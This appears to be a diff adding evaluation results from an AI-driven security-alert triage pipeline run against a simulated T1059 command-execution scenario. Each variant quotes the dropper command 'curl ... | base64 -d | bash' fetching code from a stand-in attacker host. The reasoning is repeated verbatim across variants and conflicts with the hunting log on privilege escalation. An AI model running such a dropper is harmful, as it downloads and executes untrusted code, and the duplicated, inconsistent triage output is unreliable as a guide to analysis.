@@ -1,0 +1,101 @@
+{
+  "scenario": "T1059 Command Execution",
+  "detected": 3,
+  "alerts_generated": 3,
+  "triage_ran": 3,
+  "avg_confidence_pct": 84.7,
+  "mitre_correct": true,
+  "triage_quality_score": 5,
+  "per_variant": [
+    {
+      "variant": "curl|base64|bash dropper",
+      "confidence_pct": 85,
+      "tier": "TRIAGE",
+      "verdict": "suspicious",
+      "summary": "High-severity alert: 'curl http://evil.example.com | base64 -d | bash' executed as www-data. Classic dropper pattern \u2014 encoded payload fetched from external host and piped directly into bash. Combined with sudo escalation, indicates web shell or supply-chain compromise. MITRE T1059.",
+      "evidence": [
+        "Command pipes curl output into bash \u2014 classic dropper",
+        "base64 -d decoding stage used to obfuscate payload",
+        "Process running as www-data \u2014 likely web shell exploitation",
+        "Outbound connection to evil.example.com \u2014 untrusted external host",
+        "Sudo escalation observed immediately before curl execution"
+      ],
+      "technique": "\u2014",
+      "escalate": true,
+      "notes": [
+        "[triage] Alert: rule 100007 | level 12 | src=198.51.100.42 | user=www-data",
+        "[triage] get_recent_events(198.51.100.42) \u2192 0 events in last 60 min",
+        "[triage] get_user_login_history(www-data) \u2192 0 events in last 7 days",
+        "[triage] No pre-classifier match \u2014 calling Ollama llama3.2 for analysis...",
+        "[triage] Verdict: suspicious | High-severity alert: 'curl http://evil.example.com | base64 -d | bash' executed ...",
+        "[triage] confidence=high (75%) | escalate=True",
+        "[hunting_agent] starting proactive hunts",
+        "[hunting_agent] Hunt 2: no privilege escalation by 'www-data' in \u00b110 min window",
+        "[hunting_agent] Hunt 3: 198.51.100.42 confined to single agent \u2014 no lateral movement detected",
+        "[hunting_agent] hunts complete",
+        "[response_agent] stub \u2014 no automated response taken. Phase 2 will add playbook execution here."
+      ],
+      "elapsed_s": 0.0
+    },
+    {
+      "variant": "sudo escalation + curl",
+      "confidence_pct": 78,
+      "tier": "TRIAGE",
+      "verdict": "suspicious",
+      "summary": "High-severity alert: 'curl http://evil.example.com | base64 -d | bash' executed as www-data. Classic dropper pattern \u2014 encoded payload fetched from external host and piped directly into bash. Combined with sudo escalation, indicates web shell or supply-chain compromise. MITRE T1059.",
+      "evidence": [
+        "Command pipes curl output into bash \u2014 classic dropper",
+        "base64 -d decoding stage used to obfuscate payload",
+        "Process running as www-data \u2014 likely web shell exploitation",
+        "Outbound connection to evil.example.com \u2014 untrusted external host",
+        "Sudo escalation observed immediately before curl execution"
+      ],
+      "technique": "\u2014",
+      "escalate": true,
+      "notes": [
+        "[triage] Alert: rule 5402 | level 11 | src=198.51.100.42 | user=www-data",
+        "[triage] get_recent_events(198.51.100.42) \u2192 0 events in last 60 min",
+        "[triage] get_user_login_history(www-data) \u2192 0 events in last 7 days",
+        "[triage] No pre-classifier match \u2014 calling Ollama llama3.2 for analysis...",
+        "[triage] Verdict: suspicious | High-severity alert: 'curl http://evil.example.com | base64 -d | bash' executed ...",
+        "[triage] confidence=high (75%) | escalate=True",
+        "[hunting_agent] starting proactive hunts",
+        "[hunting_agent] Hunt 2: no privilege escalation by 'www-data' in \u00b110 min window",
+        "[hunting_agent] Hunt 3: 198.51.100.42 confined to single agent \u2014 no lateral movement detected",
+        "[hunting_agent] hunts complete",
+        "[response_agent] stub \u2014 no automated response taken. Phase 2 will add playbook execution here."
+      ],
+      "elapsed_s": 0.0
+    },
+    {
+      "variant": "Outbound C2 connection",
+      "confidence_pct": 91,
+      "tier": "TRIAGE",
+      "verdict": "suspicious",
+      "summary": "High-severity alert: 'curl http://evil.example.com | base64 -d | bash' executed as www-data. Classic dropper pattern \u2014 encoded payload fetched from external host and piped directly into bash. Combined with sudo escalation, indicates web shell or supply-chain compromise. MITRE T1059.",
+      "evidence": [
+        "Command pipes curl output into bash \u2014 classic dropper",
+        "base64 -d decoding stage used to obfuscate payload",
+        "Process running as www-data \u2014 likely web shell exploitation",
+        "Outbound connection to evil.example.com \u2014 untrusted external host",
+        "Sudo escalation observed immediately before curl execution"
+      ],
+      "technique": "\u2014",
+      "escalate": true,
+      "notes": [
+        "[triage] Alert: rule 100011 | level 13 | src=198.51.100.42 | user=www-data",
+        "[triage] get_recent_events(198.51.100.42) \u2192 0 events in last 60 min",
+        "[triage] get_user_login_history(www-data) \u2192 0 events in last 7 days",
+        "[triage] No pre-classifier match \u2014 calling Ollama llama3.2 for analysis...",
+        "[triage] Verdict: suspicious | High-severity alert: 'curl http://evil.example.com | base64 -d | bash' executed ...",
+        "[triage] confidence=high (75%) | escalate=True",
+        "[hunting_agent] starting proactive hunts",
+        "[hunting_agent] Hunt 2: no privilege escalation by 'www-data' in \u00b110 min window",
+        "[hunting_agent] Hunt 3: 198.51.100.42 confined to single agent \u2014 no lateral movement detected",
+        "[hunting_agent] hunts complete",
+        "[response_agent] stub \u2014 no automated response taken. Phase 2 will add playbook execution here."
+      ],
+      "elapsed_s": 0.0
+    }
+  ]
+}
